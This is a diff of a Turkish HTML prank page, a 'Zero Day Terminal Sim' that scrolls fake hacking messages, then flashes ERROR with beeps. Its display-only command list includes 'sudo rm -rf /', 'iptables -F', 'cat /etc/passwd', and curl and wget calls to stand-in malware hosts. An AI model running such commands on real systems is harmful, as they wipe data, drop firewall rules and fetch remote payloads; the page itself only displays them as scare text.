@@ -1,69 +1,239 @@
 <!DOCTYPE html>
 <html lang="tr">
 <head>
-  <meta charset="UTF-8" />
-  <title>ERROR - Simülasyon</title>
-  <style>
-    html, body {
-      background-color: black;
-      margin: 0;
-      padding: 0;
-      overflow: hidden;
-      height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-    }
-
-    #error {
-      font-size: 64px;
-      font-weight: bold;
-      color: red;
-      font-family: 'Courier New', monospace;
-      text-shadow: 0 0 10px red, 0 0 20px red;
-      display: none;
-      animation: blink 1s infinite;
-    }
-
-    @keyframes blink {
-      0%, 100% { opacity: 1; }
-      50% { opacity: 0; }
-    }
-  </style>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Zero Day Terminal Sim</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
+  body {
+    margin:0; padding:0; background:black; color:#0f0; font-family: 'Share Tech Mono', monospace;
+    overflow: hidden;
+  }
+  #startBox {
+    position: fixed;
+    top:50%; left:50%;
+    transform: translate(-50%, -50%);
+    background: #111;
+    border: 2px solid #0f0;
+    padding: 20px 40px;
+    font-size: 2rem;
+    color: #0f0;
+    user-select:none;
+    z-index: 10;
+    display: flex;
+    align-items: center;
+    gap: 20px;
+    border-radius: 8px;
+  }
+  #closeBtn {
+    cursor: pointer;
+    font-weight: bold;
+    font-size: 2rem;
+    color: #0f0;
+    user-select:none;
+  }
+  #terminalArea {
+    position: fixed;
+    top:0; left:0; right:0; bottom:0;
+    background: black;
+    display: none;
+    overflow: hidden;
+  }
+  .textLayer {
+    position: absolute;
+    font-family: 'Share Tech Mono', monospace;
+    white-space: pre-wrap;
+    user-select:none;
+    pointer-events:none;
+  }
+  #redText {
+    top: 5vh; left: 5vw;
+    color: #f33;
+    font-size: 1.1rem;
+    width: 40vw;
+    height: 90vh;
+    overflow-y: auto;
+  }
+  #greenText {
+    bottom: 5vh; left: 55vw;
+    color: #0f0;
+    font-size: 1.1rem;
+    width: 40vw;
+    height: 50vh;
+    overflow-y: auto;
+  }
+  #whiteText {
+    bottom: 0; left: 0;
+    color: #eee;
+    font-size: 0.9rem;
+    width: 100vw;
+    height: 30vh;
+    overflow-y: auto;
+    background: black;
+  }
+  #errorBox {
+    position: fixed;
+    top: 50%; left: 50%;
+    transform: translate(-50%, -50%);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 4rem;
+    color: #f00;
+    text-transform: uppercase;
+    font-weight: bold;
+    text-shadow:
+       0 0 5px #f00,
+       0 0 10px #f00,
+       0 0 20px #f00,
+       0 0 40px #ff0000,
+       0 0 80px #ff0000;
+    display: none;
+    user-select:none;
+    z-index: 100;
+  }
+</style>
 </head>
 <body>
-  <div id="error">ERROR</div>
 
-  <audio id="beep-sound" preload="auto">
-    <source src="https://www.soundjay.com/button/sounds/beep-07.mp3" type="audio/mpeg">
-  </audio>
+<div id="startBox">
+  @mhmtxaslan
+  <div id="closeBtn" title="Başlat">×</div>
+</div>
 
-  <script>
-    const errorEl = document.getElementById("error");
-    const beep = document.getElementById("beep-sound");
+<div id="terminalArea">
+  <div id="redText" class="textLayer"></div>
+  <div id="greenText" class="textLayer"></div>
+  <div id="whiteText" class="textLayer"></div>
+</div>
 
-    let errorInterval;
+<div id="errorBox">ERROR</div>
 
-    function startErrorSequence() {
-      errorEl.style.display = "block";
-      errorInterval = setInterval(() => {
-        beep.currentTime = 0;
-        beep.play();
-      }, 500); // 500 ms'de bir bip sesi
-    }
+<audio id="beepAudio" src="https://actions.google.com/sounds/v1/alarms/beep_short.ogg" preload="auto"></audio>
 
-    function stopErrorSequence() {
-      clearInterval(errorInterval);
-    }
+<script>
+  const startBox = document.getElementById('startBox');
+  const closeBtn = document.getElementById('closeBtn');
+  const terminalArea = document.getElementById('terminalArea');
+  const redText = document.getElementById('redText');
+  const greenText = document.getElementById('greenText');
+  const whiteText = document.getElementById('whiteText');
+  const errorBox = document.getElementById('errorBox');
+  const beepAudio = document.getElementById('beepAudio');
 
-    // ERROR başlasın
-    startErrorSequence();
+  // Korkutucu Türkçe yazılar örnekleri (kendi ekle istersen)
+  const redLines = [
+    "HACKLENİYORSUN...",
+    "GİZLİ BİLGİLERİN ÇALINIYOR...",
+    "SİSTEME İZİNSİZ ERİŞİM TESPİT EDİLDİ",
+    "ŞİFRENİZ ELE GEÇİRİLDİ",
+    "VİRÜS BULAŞTIRILDI",
+    "FİREWALL DELİNDİ",
+    "SİSTEM KONTROLÜ KAYBEDİLDİ",
+    "VERİ TABANI YOK EDİLİYOR",
+    "SUNUCUYA SALDIRI BAŞLADI",
+    "DOSYALARINIZ ŞİFRELENDİ",
+  ];
+  const greenLines = [
+    "BAŞARILI GİRİŞ",
+    "VERİ AKIYOR",
+    "KOMUT ÇALIŞTIRILIYOR",
+    "AĞ BAĞLANTISI KURULDU",
+    "PROTOKOL SİLİNDİ",
+    "KONTROL SAĞLANDI",
+    "BAĞLANTI GÜÇLENDİRİLDİ",
+    "İŞLEM BAŞARIYLA TAMAMLANDI",
+    "ŞİFRE KIRILDI",
+    "BAĞLANTI KAPANDI",
+  ];
+  const whiteLines = [
+    "root@server:~$ sudo rm -rf /",
+    "iptables -F",
+    "ssh-keygen -R 192.168.1.1",
+    "netstat -an | grep ESTABLISHED",
+    "curl http://malicious.site/payload",
+    "chmod 777 hack.sh",
+    "echo 'Exploit çalıştırılıyor...'",
+    "cat /etc/passwd",
+    "sudo service ssh restart",
+    "wget http://badserver.com/malware",
+  ];
 
-    // 20 saniye sonra durdur
+  function randomFromArray(arr) {
+    return arr[Math.floor(Math.random() * arr.length)];
+  }
+
+  // Satır ekleme fonksiyonu
+  function addLines(container, lines, count, interval, callback) {
+    let added = 0;
+    const id = setInterval(() => {
+      container.textContent += randomFromArray(lines) + "\n";
+      container.scrollTop = container.scrollHeight;
+      added++;
+      if (added >= count) {
+        clearInterval(id);
+        if (callback) callback();
+      }
+    }, interval);
+  }
+
+  // Bip sesi art arda çalması için
+  function playBeeps(times, delay, callback) {
+    let count = 0;
+    const interval = setInterval(() => {
+      beepAudio.currentTime = 0;
+      beepAudio.play();
+      count++;
+      if (count >= times) {
+        clearInterval(interval);
+        if (callback) callback();
+      }
+    }, delay);
+  }
+
+  // Yanıp sönen arka plan için
+  let bgBlinkInterval;
+  function startBgBlink() {
+    let on = false;
+    bgBlinkInterval = setInterval(() => {
+      document.body.style.backgroundColor = on ? '#330000' : 'black';
+      on = !on;
+    }, 500);
+  }
+  function stopBgBlink() {
+    clearInterval(bgBlinkInterval);
+    document.body.style.backgroundColor = 'black';
+  }
+
+  // Başlatma fonksiyonu
+  function startTerminal() {
+    startBox.style.display = "none";
+    terminalArea.style.display = "block";
+
+    // 1000 satır gibi yazılar olacak, interval 30ms, toplam ~30 saniyede tamamlanacak
+    // Her renk ayrı alan, önce kırmızı sonra yeşil sonra beyaz olarak devam edecek.
+    // Kırmızı yazılar 350 satır, yeşil 350 satır, beyaz 300 satır (toplam 1000 satır)
+
+    addLines(redText, redLines, 350, 30, () => {});
+    addLines(greenText, greenLines, 350, 30, () => {});
+    addLines(whiteText, whiteLines, 300, 30, () => {});
+
+    // 20 saniye sonra ERROR ve bip başlat
     setTimeout(() => {
-      stopErrorSequence();
-      errorEl.style.display = "none";
+      errorBox.style.display = "block";
+      startBgBlink();
+      playBeeps(60, 500);
     }, 20000);
-  </script>
+
+    // 30 saniye sonunda işlem biter
+    setTimeout(() => {
+      stopBgBlink();
+    }, 30000);
+  }
+
+  closeBtn.addEventListener("click", () => {
+    startTerminal();
+  });
+</script>
+
 </body>
 </html>
